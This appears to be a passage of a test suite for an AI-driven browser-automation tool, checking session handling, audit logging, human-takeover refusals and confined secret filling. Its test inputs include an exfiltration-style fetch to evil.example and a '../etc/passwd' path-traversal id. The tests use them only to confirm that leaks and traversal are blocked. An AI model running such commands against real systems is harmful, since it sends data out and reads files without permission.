	const { ctx, registry, record } = await harness();
	const result = await tools.browserNavigate({ url: 'https://a.test/', new_session: true }, ctx);
	const parsed = JSON.parse(textOf(result)) as { session_id: string };
	assert(parsed.session_id !== record.id, 'a new session must not reuse the default id');
	assertEquals(registry.size, 2);
	await registry.shutdown();
});

// --------------------------------------------------------------------------- session files
// ---------------------------------------------------------------------------

Deno.test('tools: list_files and get_file never create a session', async () => {
	const registry = new SessionRegistry({ reapIntervalMs: 0, launch: () => Promise.resolve(fakeSession().session) });
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	const listed = await assertRejects(() => tools.browserListFiles({}, ctx), ToolError);
	assertEquals(listed.code, 'unknown-session');
	const fetched = await assertRejects(() => tools.browserGetFile({ file_id: 'G1' }, ctx), ToolError);
	assertEquals(fetched.code, 'unknown-session');
	assertEquals(registry.size, 0, 'a peek must not launch the default session');
	await registry.shutdown();
});

Deno.test('tools: list_files on a live session reports the inline limit and an empty list', async () => {
	const { ctx, registry, record } = await harness();
	const result = await tools.browserListFiles({}, ctx);
	const parsed = JSON.parse(textOf(result)) as { session_id: string; files: unknown[]; inline_limit_bytes: number };
	assertEquals(parsed.session_id, record.id);
	assertEquals(parsed.files, []);
	assertEquals(parsed.inline_limit_bytes, 1024 * 1024);
	await registry.shutdown();
});

Deno.test('tools: get_file on an unknown id is unknown-file, and never a path', async () => {
	const { ctx, registry } = await harness();
	const error = await assertRejects(() => tools.browserGetFile({ file_id: '../etc/passwd' }, ctx), ToolError);
	assertEquals(error.code, 'unknown-file');
	await registry.shutdown();
});

Deno.test('tools: a click whose action result names a tracked download appends its metadata', async () => {
	const fake = fakeSession({ selectorMap: new Map([[3, fakeNode()]]) });
	fake.session.eventBus.dispatch = ((event: Record<string, unknown>) => {
		fake.dispatched.push({ name: event.constructor.name, event });
		return { eventResult: () => Promise.resolve({ download: { guid: 'G1', completed: true } }) };
	}) as never;
	const ledgerRecord = {
		guid: 'G1',
		url: 'http://x/r?token=secret',
		suggestedFilename: 'r.txt',
		fileName: 'r.txt',
		path: '/downloads/G1',
		fileSize: 3,
		receivedBytes: 3,
		totalBytes: 3,
		fileType: 'txt',
		mimeType: null,
		autoDownload: false,
		state: 'completed' as const,
		startedAt: 1,
		completedAt: 2,
		error: null,
	};
	const registry = new SessionRegistry({
		reapIntervalMs: 0,
		launch: () =>
			Promise.resolve({
				session: fake.session,
				downloads: { downloads: [ledgerRecord], isRemoteBrowser: false, lookup: () => ledgerRecord } as never,
				downloadsDir: null,
			}),
	});
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	await registry.resolve(undefined);
	const result = await tools.browserClick({ index: 3 }, ctx);
	const joined = textOf(result);
	assertStringIncludes(joined, 'Clicked element 3 in session default.');
	assertStringIncludes(joined, '"file_id": "G1"');
	assert(!joined.includes('/downloads/G1'), 'no path in the click result');
	assert(!joined.includes('token=secret'), 'no source URL in the click result');
	const structured = (result as { structuredContent?: { download?: { file_id: string; available: boolean } } })
		.structuredContent;
	assertEquals(structured?.download?.file_id, 'G1');
	assertEquals(structured?.download?.available, true);
	await registry.shutdown();
});

Deno.test('tools: a click with no download keeps the plain text result', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });
	const result = await tools.browserClick({ index: 3 }, ctx);
	assertEquals((result.content as unknown[]).length, 1);
	assertEquals(textOf(result), 'Clicked element 3 in session default.');
	await registry.shutdown();
});

// --- the element record on the wire ------------------------------------------------------------

Deno.test('tools: browser_get_state with no optional argument keeps the text block byte-identical', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const result = await tools.browserGetState({}, h.ctx) as {
			content: Array<{ text: string }>;
			structuredContent: Record<string, unknown>;
		};
		const frozen = JSON.parse(result.content[0]!.text) as { interactive_elements: Array<Record<string, unknown>> };
		for (const element of frozen.interactive_elements) {
			for (const key of Object.keys(element)) assert(['index', 'tag', 'label', 'role', 'href'].includes(key), key);
		}
		for (const key of ['state_token', 'frames', 'focused_index', 'elements_total', 'capture_truncated']) {
			assert(!(key in frozen), `${key} leaked into the text block`);
			assert(key in result.structuredContent, `${key} missing from structuredContent`);
		}
		const rich = result.structuredContent.interactive_elements as Array<Record<string, unknown>>;
		assert(rich.every((element) => 'bounds' in element && 'frame_id' in element && 'visible' in element));
		assert(rich.every((element) => !('locator' in element) && !('attrs' in element) && !('input' in element)));
		assertEquals(result.structuredContent.elements_truncated, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_get_state fields select the record, and the text block still does not grow', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const minimal = await tools.browserGetState({ fields: ['minimal'] }, h.ctx) as { content: Array<{ text: string }> };
		const full = await tools.browserGetState({ fields: ['full'] }, h.ctx) as {
			content: Array<{ text: string }>;
			structuredContent: Record<string, unknown>;
		};
		assertEquals(
			full.content[0]!.text,
			minimal.content[0]!.text,
			'the text block is the same bytes under every preset',
		);
		const rich = full.structuredContent.interactive_elements as Array<Record<string, unknown>>;
		assert(rich.some((element) => 'input' in element && 'attrs' in element && 'locators' in element));
		assert(!JSON.stringify(full).includes('P4ssw0rd-SENTINEL'), 'the corpus password is on no surface');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_scroll reports the geometry after the scroll, not the cached one before it', async () => {
	const fake = fakeSession({ selectorMap: new Map() });
	let scrolledTo = 0;
	(fake.session as unknown as { getBrowserStateSummary: (o: { includeDom?: boolean }) => Promise<unknown> })
		.getBrowserStateSummary = (options) => {
			assertEquals(options.includeDom, false, 'the after-read must never rebuild the index table');
			return Promise.resolve({
				stateError: null,
				pageInfo: { scrollX: 0, scrollY: scrolledTo, pixelsAbove: scrolledTo, pixelsBelow: 100, viewportHeight: 720 },
			});
		};
	const registry = new SessionRegistry({ reapIntervalMs: 0, launch: () => Promise.resolve(fake.session) });
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	await registry.resolve(undefined);
	scrolledTo = 540;
	const result = await tools.browserScroll({ direction: 'down' }, ctx) as {
		structuredContent: { scroll: { y: number } };
	};
	assertEquals(result.structuredContent.scroll.y, 540);
	await registry.shutdown();
});

// --- frames and the locator tools --------------------------------------------------------------

Deno.test('tools: browser_get_frames lists the frames with both honesty markers and the token', async () => {
	const h = await captureHarness('iframe_crossorigin');
	try {
		const result = await tools.browserGetFrames({}, h.ctx) as {
			structuredContent: {
				frames: Array<{ id: string; parent: string | null; is_oopif: boolean; bounds_composed: boolean; url: string }>;
				capture_truncated: boolean;
				state_token: string | null;
			};
		};
		const payload = result.structuredContent;
		assertEquals(payload.frames.length, 2);
		assertEquals(payload.frames[0]!.parent, null);
		assertEquals(payload.frames[1]!.is_oopif, true);
		assertEquals(payload.frames[1]!.bounds_composed, true);
		assertStringIncludes(payload.frames[1]!.url, 'localhost:38112');
		assertEquals(payload.capture_truncated, false);
		assert(typeof payload.state_token === 'string');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_locator_candidates resolves the index like an action would, token included', async () => {
	const h = await captureHarness('iframe_crossorigin');
	try {
		await tools.browserGetState({}, h.ctx);
		const held = h.record.session.cachedBrowserState!.stateToken!;
		const result = await tools.browserLocatorCandidates({ index: 15, state_token: held }, h.ctx) as {
			structuredContent: {
				index: number;
				frame_id: string;
				locators: Array<{ kind: string; value: string; unique: boolean }>;
				best: { kind: string; value: string } | null;
				state_token: string;
			};
		};
		const payload = result.structuredContent;
		assertEquals(payload.index, 15);
		assertEquals(payload.locators.map((c) => c.kind), ['id', 'aria', 'text']);
		assertEquals(payload.best, payload.locators[0] ?? null, 'the first unique candidate');
		assertEquals(payload.state_token, held);
		const error = await assertRejects(
			() => tools.browserLocatorCandidates({ index: 15, state_token: '0000000000000000.0000000000000000' }, h.ctx),
			ToolError,
		);
		assertEquals(error.code, 'element-not-found');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_verify_locator counts aria and label in memory, refuses a malformed value', async () => {
	const h = await captureHarness('iframe_crossorigin');
	try {
		const result = await tools.browserVerifyLocator(
			{ locator: { kind: 'aria', value: 'role=button[name="Host page button"]' } },
			h.ctx,
		) as {
			structuredContent: {
				matches: number;
				unique: boolean;
				first: { index: number; label?: string } | null;
				frame_id: string;
			};
		};
		assertEquals(result.structuredContent.matches, 1);
		assertEquals(result.structuredContent.unique, true);
		assertEquals(result.structuredContent.first?.label, 'Host page button');
		const none = await tools.browserVerifyLocator(
			{ locator: { kind: 'aria', value: 'role=button[name="Cross origin button"]' } },
			h.ctx,
		) as { structuredContent: { matches: number; first: unknown } };
		assertEquals(none.structuredContent.matches, 0);
		assertEquals(none.structuredContent.first, null);
		const malformed = [['aria', 'button named x'], ['label', 'Password'], ['text', 'Save'], ['css', '  ']] as const;
		for (const [kind, value] of malformed) {
			const error = await assertRejects(
				() => tools.browserVerifyLocator({ locator: { kind, value } }, h.ctx),
				ToolError,
			);
			assertEquals(error.code, 'invalid-arguments', `${kind}: ${value}`);
		}
		const unknownFrame = await assertRejects(
			() => tools.browserVerifyLocator({ locator: { kind: 'label', value: 'label=x' }, frame_id: 'nope' }, h.ctx),
			ToolError,
		);
		assertEquals(unknownFrame.code, 'invalid-arguments');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: browser_verify_locator discards every DOM search before returning, on success and on failure', async () => {
	const h = await captureHarness('iframe_crossorigin');
	try {
		const calls: string[] = [];
		let failGet = false;
		const dom = {
			getDocument: () => {
				calls.push('getDocument');
				return Promise.resolve({ root: { nodeId: 1 } });
			},
			performSearch: () => {
				calls.push('performSearch');
				return Promise.resolve({ searchId: 'S1', resultCount: 2 });
			},
			getSearchResults: () => {
				calls.push('getSearchResults');
				if (failGet) return Promise.reject(new Error('boom'));
				return Promise.resolve({ nodeIds: [1, 2] });
			},
			describeNode: ({ nodeId }: { nodeId: number }) => {
				calls.push(`describeNode:${nodeId}`);
				const button = [...h.record.session.cachedBrowserState!.domState.selectorMap.values()]
					.find((node) => node.attributes['id'] === 'host-button')!;
				return Promise.resolve({ node: { backendNodeId: nodeId === 2 ? button.backendNodeId : 999_999 } });
			},
			discardSearchResults: ({ searchId }: { searchId: string }) => {
				calls.push(`discard:${searchId}`);
				return Promise.resolve({});
			},
		};
		const session = h.record.session as unknown as Record<string, unknown>;
		const rootSessionId = h.capture.sessions[0]!.sessionId;
		session.cdpClient = { send: { DOM: dom } };
		session.sessionManager = {
			getOrCreateCdpSession: () => Promise.resolve({ sessionId: rootSessionId, targetId: 'T' }),
			resyncTargets: () => Promise.resolve(),
		};
		session.agentFocusTargetId = 'T';

		const ok = await tools.browserVerifyLocator({ locator: { kind: 'id', value: '#host-button' } }, h.ctx) as {
			structuredContent: { matches: number; unique: boolean; first: { label?: string } | null };
		};
		assertEquals(ok.structuredContent.matches, 2, 'the browser count is reported as the browser gave it');
		assertEquals(ok.structuredContent.unique, false);
		assertEquals(ok.structuredContent.first?.label, 'Host page button', 'the first result that maps to an index');
		assertEquals(calls, [
			'getDocument',
			'performSearch',
			'getSearchResults',
			'describeNode:1',
			'describeNode:2',
			'discard:S1',
		]);

		calls.length = 0;
		failGet = true;
		const error = await assertRejects(
			() => tools.browserVerifyLocator({ locator: { kind: 'css', value: 'button' } }, h.ctx),
			ToolError,
		);
		assertEquals(error.code, 'browser-unavailable');
		assertEquals(
			calls,
			['getDocument', 'performSearch', 'getSearchResults', 'discard:S1'],
			'discarded on the failure path too',
		);
	} finally {
		await h.registry.shutdown();
	}
});

// --- browser_wait_for --------------------------------------------------------

Deno.test('wait_for: exactly one condition, or invalid-arguments', async () => {
	const h = await harness();
	try {
		for (const until of [{}, { navigation: true as const, dialog: true as const }]) {
			const error = await assertRejects(
				() => tools.browserWaitFor({ until, timeout_ms: 100 }, h.ctx),
				ToolError,
			);
			assertEquals(error.code, 'invalid-arguments');
			assertStringIncludes(error.message, 'exactly one');
		}
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: an expired wait is a success carrying met false, never an error', async () => {
	const h = await harness();
	try {
		const result = await tools.browserWaitFor({ until: { navigation: true }, timeout_ms: 60 }, h.ctx);
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, false);
		assertEquals(payload.event, null);
		assertEquals((result as { isError?: boolean }).isError, undefined);
		assert(typeof payload.after_ms === 'number' && payload.after_ms >= 0);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: network_idle needs a connected session and says so', async () => {
	const h = await harness();
	try {
		const error = await assertRejects(
			() => tools.browserWaitFor({ until: { network_idle: 100 }, timeout_ms: 200 }, h.ctx),
			ToolError,
		);
		assertEquals(error.code, 'browser-unavailable');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a state_token that is already stale is met at once', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const result = await tools.browserWaitFor(
			{ until: { state_token_changes: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, timeout_ms: 5000 },
			h.ctx,
		);
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, true, 'the held token is not the one the caller named');
		assertEquals(payload.event, null, 'a token change is not an event on the ring');
		assert(typeof payload.state_token === 'string', 'and the current token comes back');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: waiting on the current state_token expires rather than firing', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const observed = await tools.browserGetState({}, h.ctx);
		const current = (observed as { structuredContent: Record<string, unknown> }).structuredContent.state_token;
		assert(typeof current === 'string');
		const result = await tools.browserWaitFor(
			{ until: { state_token_changes: current }, timeout_ms: 120 },
			h.ctx,
		);
		assertEquals((result as { structuredContent: Record<string, unknown> }).structuredContent.met, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a selector predicate on a session with no CDP client expires quietly', async () => {
	const h = await harness();
	try {
		const result = await tools.browserWaitFor({ until: { selector: '#nope' }, timeout_ms: 120 }, h.ctx);
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a dialog on the ring satisfies a dialog wait', async () => {
	const h = await harness();
	try {
		const waiting = tools.browserWaitFor({ until: { dialog: true }, timeout_ms: 5000 }, h.ctx);
		await new Promise((resolve) => setTimeout(resolve, 10));
		h.record.events.append('dialog', { dialog_id: 'd1', kind: 'confirm', message: 'ok?' });
		const result = await waiting;
		const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, true);
		assertEquals((payload.event as { kind: string }).kind, 'dialog');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('wait_for: a download wait is satisfied by any of the three download kinds', async () => {
	for (const kind of ['download.started', 'download.done', 'download.failed'] as const) {
		const h = await harness();
		try {
			const waiting = tools.browserWaitFor({ until: { download: true }, timeout_ms: 5000 }, h.ctx);
			await new Promise((resolve) => setTimeout(resolve, 10));
			h.record.events.append(kind, { file_id: 'g', filename: 'f', status: 'completed' });
			const payload = (await waiting as { structuredContent: Record<string, unknown> }).structuredContent;
			assertEquals(payload.met, true, kind);
			assertEquals((payload.event as { kind: string }).kind, kind);
		} finally {
			await h.registry.shutdown();
		}
	}
});

Deno.test('wait_for: a closed session ends the wait rather than holding it to the deadline', async () => {
	const h = await harness();
	try {
		const waiting = tools.browserWaitFor({ until: { navigation: true }, timeout_ms: 30_000 }, h.ctx);
		await new Promise((resolve) => setTimeout(resolve, 10));
		await h.registry.close(h.record.id, 'session-closed');
		const payload = (await waiting as { structuredContent: Record<string, unknown> }).structuredContent;
		assertEquals(payload.met, false);
	} finally {
		await h.registry.shutdown();
	}
});

// --- browser_evaluate --------------------------------------------------------

/** Wires a capture-backed session to a scripted `Runtime.evaluate` / `Page.getFrameTree` pair. */
function wireEvaluate(
	record: { session: unknown },
	answer: (params: Record<string, unknown>) => Promise<unknown>,
	frameUrl = 'https://example.com/page',
) {
	const calls: Array<{ method: string; params: Record<string, unknown> }> = [];
	const session = record.session as Record<string, unknown>;
	const topFrameId = (session.cachedBrowserState as { frames: Array<{ frameId: string }> }).frames[0]!.frameId;
	session.cdpClient = {
		send: {
			Runtime: {
				evaluate: (params: Record<string, unknown>) => {
					calls.push({ method: 'Runtime.evaluate', params });
					return answer(params);
				},
			},
			Page: {
				getFrameTree: () => {
					calls.push({ method: 'Page.getFrameTree', params: {} });
					return Promise.resolve({ frameTree: { frame: { id: topFrameId, url: frameUrl } } });
				},
			},
		},
	};
	session.sessionManager = { getOrCreateCdpSession: () => Promise.resolve({ sessionId: 'S1', targetId: 'T' }) };
	session.agentFocusTargetId = 'T';
	return { calls, topFrameId };
}

Deno.test('evaluate: browser_evaluate returns the value and writes exactly one audit entry', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const wired = wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'number', value: 42 } }));
		const result = await tools.browserEvaluate({ expression: '6 * 7' }, h.ctx) as {
			structuredContent: { ok: boolean; type: string; value: unknown; truncated: boolean; audit_id: string };
		};
		assertEquals(result.structuredContent.ok, true);
		assertEquals(result.structuredContent.value, 42);
		assertEquals(result.structuredContent.truncated, false);
		assert(wired.calls.some((call) => call.method === 'Runtime.evaluate'));

		const ledger = h.record.audit.read({ principal: 'test' });
		assertEquals(ledger.entries.length, 1);
		const entry = ledger.entries[0]!;
		assertEquals(entry.kind, 'evaluate');
		assertEquals(entry.audit_id, result.structuredContent.audit_id);
		assertEquals(entry.principal, 'test');
		assertEquals(entry.expression_bytes, 5);
		assertEquals(entry.origin, 'https://example.com');
		assertEquals(entry.ok, true);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('evaluate: the expression body never reaches the audit ledger or the result', async () => {
	const h = await captureHarness('form_attributes');
	const sentinel = 'Zq8-EXPR-SENTINEL-3vP';
	try {
		wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'undefined' } }));
		const result = await tools.browserEvaluate(
			{ expression: `fetch('https://evil.example/?c=${sentinel}')` },
			h.ctx,
		);
		const serialized = JSON.stringify(result) + JSON.stringify(h.record.audit.read({ principal: 'test', all: true }));
		assert(!serialized.includes(sentinel), 'the expression body escaped into a result or the ledger');
		assert(!serialized.includes('evil.example'), 'an expression fragment escaped');
		assert(!serialized.includes('fetch('), 'an expression prefix escaped');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('evaluate: a page exception is a SUCCESS result with ok:false, and is still audited', async () => {
	const h = await captureHarness('form_attributes');
	try {
		wireEvaluate(h.record, () =>
			Promise.resolve({
				result: { type: 'object' },
				exceptionDetails: { exception: { description: 'TypeError: nope is not a function' } },
			}));
		const result = await tools.browserEvaluate({ expression: 'nope()' }, h.ctx) as {
			isError?: boolean;
			structuredContent: { ok: boolean; error_text?: string };
		};
		assertEquals(result.isError, undefined, 'a page exception must not be a tool error');
		assertEquals(result.structuredContent.ok, false);
		assertStringIncludes(result.structuredContent.error_text ?? '', 'TypeError');
		assertEquals(h.record.audit.read({ principal: 'test' }).entries[0]?.ok, false);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('evaluate: browser_evaluate is refused while a human holds the session', async () => {
	const h = await captureHarness('form_attributes');
	try {
		wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'undefined' } }));
		h.record.lock = { principal: 'human', takenAt: Date.now() } as never;
		const error = await assertRejects(() => tools.browserEvaluate({ expression: '1' }, h.ctx), ToolError);
		assertEquals(error.code, 'human-has-control');
		assertEquals(h.record.audit.read({ principal: 'test' }).entries.length, 0, 'a refusal writes no entry');
	} finally {
		h.record.lock = null;
		await h.registry.shutdown();
	}
});

Deno.test('evaluate: an unreadable frame URL costs the origin, never the audit record', async () => {
	const h = await captureHarness('form_attributes');
	try {
		const session = h.record.session as unknown as Record<string, unknown>;
		wireEvaluate(h.record, () => Promise.resolve({ result: { type: 'undefined' } }));
		((session.cdpClient as { send: { Page: { getFrameTree: unknown } } }).send.Page as { getFrameTree: unknown })
			.getFrameTree = () => Promise.reject(new Error('target closed'));
		await tools.browserEvaluate({ expression: '1' }, h.ctx);
		assertEquals(h.record.audit.read({ principal: 'test' }).entries[0]?.origin, '');
	} finally {
		await h.registry.shutdown();
	}
});

/** **Naming the top frame's id is the same call as omitting `frame_id`.** */
Deno.test('evaluate: browser_evaluate {frame_id: <top id>} is the omitted-frame_id call, byte for byte', async () => {
	const named = await captureHarness('form_attributes');
	const omitted = await captureHarness('form_attributes');
	try {
		const answer = () => Promise.resolve({ result: { type: 'number', value: 42 } });
		const wiredNamed = wireEvaluate(named.record, answer);
		const wiredOmitted = wireEvaluate(omitted.record, answer);

		const withId = await tools.browserEvaluate(
			{ expression: '6 * 7', frame_id: wiredNamed.topFrameId },
			named.ctx,
		) as { structuredContent: Record<string, unknown> };
		const without = await tools.browserEvaluate({ expression: '6 * 7' }, omitted.ctx) as {
			structuredContent: Record<string, unknown>;
		};

		assertEquals(wiredNamed.calls, wiredOmitted.calls);
		assertEquals(wiredNamed.calls.map((call) => call.method), ['Runtime.evaluate', 'Page.getFrameTree']);
		assertEquals(wiredNamed.calls[0]?.params, {
			expression: '6 * 7',
			returnByValue: true,
			awaitPromise: true,
			silent: true,
			timeout: 1000,
		});
		assertEquals(wiredNamed.calls.filter((call) => call.method === 'Runtime.callFunctionOn'), []);

		const strip = (payload: Record<string, unknown>) => ({ ...payload, audit_id: '<ulid>', session_id: '<id>' });
		assertEquals(strip(withId.structuredContent), strip(without.structuredContent));
		assertEquals(withId.structuredContent.frame_id, wiredNamed.topFrameId);
		assertEquals(withId.structuredContent.value, 42);

		const rowNamed = named.record.audit.read({ principal: 'test' }).entries;
		const rowOmitted = omitted.record.audit.read({ principal: 'test' }).entries;
		assertEquals(rowNamed.length, 1);
		assertEquals(rowNamed[0]?.origin, rowOmitted[0]?.origin);
		assertEquals(rowNamed[0]?.frame_id, rowOmitted[0]?.frame_id);
	} finally {
		await omitted.registry.shutdown();
		await named.registry.shutdown();
	}
});

// --- browser_fill_secret, the zoom guard and the audit reader -----------------

/** The password input the `form_attributes` capture carries, with its sentinel value. */
const PASSWORD_INDEX = 6;
/** A `type=date` input: an element the index resolves to that a credential must not go into. */
const DATE_INDEX = 3;
/** The capture's single frame. */
const FORM_FRAME = 'A4B12682576331EE39AA9EFE83F974E0';

interface SecretWire {
	readonly topUrl?: string;
	readonly frameUrl?: string;
	readonly scale?: number;
	/**
	 * Drops the element's frame from the live tree: the page navigated, or Chromium replaced the main
	 * frame, between the state read and the fill.
	 */
	readonly dropFrame?: boolean;
}

/** Wires the capture-backed session with a scripted frame tree and layout metrics. */
function wireSecrets(record: { session: unknown }, wire: SecretWire = {}) {
	const calls: string[] = [];
	const session = record.session as Record<string, unknown>;
	const topUrl = wire.topUrl ?? 'https://bank.example.com/login';
	const frameUrl = wire.frameUrl ?? topUrl;
	session.cdpClient = {
		send: {
			Page: {
				getFrameTree: () => {
					calls.push('Page.getFrameTree');
					return Promise.resolve({
						frameTree: {
							frame: { id: 'TOP', url: topUrl },
							childFrames: wire.dropFrame === true ? [] : [{ frame: { id: FORM_FRAME, url: frameUrl } }],
						},
					});
				},
				getLayoutMetrics: () => {
					calls.push('Page.getLayoutMetrics');
					const scale = wire.scale ?? 1;
					return Promise.resolve({
						layoutViewport: { pageX: 0, pageY: 0, clientWidth: 1280, clientHeight: 720 },
						visualViewport: { offsetX: 0, offsetY: 0, pageX: 0, pageY: 0, clientWidth: 1280, clientHeight: 720, scale },
						contentSize: { x: 0, y: 0, width: 1280, height: 2000 },
						cssVisualViewport: {
							offsetX: 0,
							offsetY: 0,
							pageX: 0,
							pageY: 0,
							clientWidth: 1280,
							clientHeight: 720,
							scale,
						},
					});
				},
			},
		},
	};
	session.sessionManager = { getOrCreateCdpSession: () => Promise.resolve({ sessionId: 'S1', targetId: 'T' }) };
	session.agentFocusTargetId = 'T';
	return { calls };
}

const BANK_SECRET = 'Zq8-BANK-SECRET-VALUE-3vP';

/** Every number anywhere in a structure, so "no field carries the length" is checkable. */
function numbersIn(value: unknown): number[] {
	if (typeof value === 'number') return [value];
	if (Array.isArray(value)) return value.flatMap(numbersIn);
	if (value !== null && typeof value === 'object') return Object.values(value).flatMap(numbersIn);
	return [];
}

async function secretHarness(wire: SecretWire = {}) {
	const h = await captureHarness('form_attributes');
	const wired = wireSecrets(h.record, wire);
	const secrets = new SecretStore([
		{ name: 'bank_password', value: BANK_SECRET, domains: ['bank.example.com'] },
		{ name: 'anywhere', value: 'Zq8-UNPINNED-VALUE-3vP', domains: [] },
		{ name: 'local_password', value: 'Zq8-LOCAL-SECRET-3vP', domains: ['http://127.0.0.1'] },
	]);
	const dispatched: Array<Record<string, unknown>> = [];
	const bus = h.record.session.eventBus as unknown as { dispatch(event: unknown): unknown };
	const original = bus.dispatch.bind(bus);
	bus.dispatch = (event: Record<string, unknown>) => {
		dispatched.push(event);
		return { eventResult: () => Promise.resolve('ok') };
	};
	const token = h.record.session.cachedBrowserState?.stateToken as string;
	const ctx: ToolContext = { ...h.ctx, secrets };
	return { ...h, ctx, wired, dispatched, token, secrets, restore: () => (bus.dispatch = original) };
}

Deno.test('fill_secret: a pinned secret is typed into a password field, and neither the value nor its length appears', async () => {
	const f = await secretHarness();
	try {
		const result = await tools.browserFillSecret(
			{ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token },
			f.ctx,
		) as { structuredContent: Record<string, unknown>; content: Array<{ text?: string }> };

		assertEquals(f.dispatched.length, 1);
		assertEquals((f.dispatched[0] as { text?: string }).text, BANK_SECRET);
		assertEquals((f.dispatched[0] as { isSensitive?: boolean }).isSensitive, true);

		const emitted = [result, f.record.audit.read({ principal: 'test' })];
		const serialized = JSON.stringify(emitted);
		assert(!serialized.includes(BANK_SECRET), serialized);
		assert(!serialized.includes(BANK_SECRET.slice(0, 6)), `a prefix leaked: ${serialized}`);
		assertEquals(numbersIn(emitted).filter((value) => value === BANK_SECRET.length), [], 'a length-shaped field');

		assertEquals(result.structuredContent.secret, 'bank_password', 'the NAME is the one thing reported');
		assertEquals(result.structuredContent.origin, 'https://bank.example.com');
		assertEquals(result.structuredContent.frame_id, FORM_FRAME);
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('fill_secret: the refusals, each with its own code, and nothing is dispatched', async () => {
	const cases: Array<{ name: string; wire?: SecretWire; args: Record<string, unknown>; code: string }> = [
		{
			name: 'a stale state_token (a reused backendNodeId in a new document)',
			args: { index: PASSWORD_INDEX, secret: 'bank_password', state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' },
			code: 'element-not-found',
		},
		{ name: 'a non-input element', args: { index: 24, secret: 'bank_password' }, code: 'element-not-interactable' },
		{
			name: 'an input that is neither password nor text',
			args: { index: DATE_INDEX, secret: 'bank_password' },
			code: 'element-not-interactable',
		},
		{
			name: 'an unpinned secret (stricter than browser_type, deliberately)',
			args: { index: PASSWORD_INDEX, secret: 'anywhere' },
			code: 'navigation-blocked',
		},
		{
			name: 'a scaled visual viewport',
			wire: { scale: 2 },
			args: { index: PASSWORD_INDEX, secret: 'bank_password' },
			code: 'browser-unavailable',
		},
		{
			name: 'a frame whose OWN url is cross-origin to the top document',
			wire: { topUrl: 'https://bank.example.com/login', frameUrl: 'https://not-the-bank.example/collect' },
			args: { index: PASSWORD_INDEX, secret: 'bank_password' },
			code: 'navigation-blocked',
		},
		{
			name: 'a page that navigated between the state read and the fill',
			wire: { topUrl: 'https://evil.example/', frameUrl: 'https://evil.example/inner' },
			args: { index: PASSWORD_INDEX, secret: 'bank_password' },
			code: 'navigation-blocked',
		},
		{
			name: 'an unknown secret name',
			args: { index: PASSWORD_INDEX, secret: 'no_such_secret' },
			code: 'invalid-arguments',
		},
	];
	for (const item of cases) {
		const f = await secretHarness(item.wire);
		try {
			const error = await assertRejects(
				() =>
					tools.browserFillSecret(
						{ state_token: f.token, ...item.args } as { index: number; secret: string; state_token: string },
						f.ctx,
					),
				ToolError,
				undefined,
				item.name,
			);
			assertEquals(error.code, item.code, `${item.name}: ${error.message}`);
			assertEquals(f.dispatched.length, 0, `${item.name}: a refusal must dispatch nothing`);
			assertEquals(f.record.audit.read({ principal: 'test' }).entries.length, 0, `${item.name}: no audit entry`);
			assert(!error.message.includes(BANK_SECRET), `${item.name} leaked the value: ${error.message}`);
			assert(!error.message.includes('P4ssw0rd'), `${item.name} leaked the field's own value: ${error.message}`);
		} finally {
			f.restore();
			await f.registry.shutdown();
		}
	}
});

Deno.test('fill_secret: the frame URL is read AFTER the element resolves and immediately BEFORE the dispatch', async () => {
	const f = await secretHarness();
	try {
		await tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx);
		assertEquals(
			f.wired.calls,
			['Page.getLayoutMetrics', 'Page.getFrameTree'],
			'the scale guard runs first so the URL read is the last await before the dispatch',
		);
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

/** **The confinement holds on a named top frame.** */
Deno.test('fill_secret: browser_fill_secret still REFUSES when the live tree no longer holds the element’s frame', async () => {
	const f = await secretHarness({ dropFrame: true });
	let substitutions = 0;
	const store = f.secrets as unknown as { substitute: (text: string, url: string) => unknown };
	const original = store.substitute.bind(f.secrets);
	store.substitute = (text: string, url: string) => {
		substitutions++;
		return original(text, url);
	};
	try {
		const error = await assertRejects(
			() => tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx),
			ToolError,
		);
		assertEquals(error.code, 'invalid-arguments');
		assertStringIncludes(error.message, 'no longer attached');
		assertStringIncludes(error.message, FORM_FRAME);

		assertEquals(substitutions, 0, 'the secret was bound to a URL before the frame check refused');
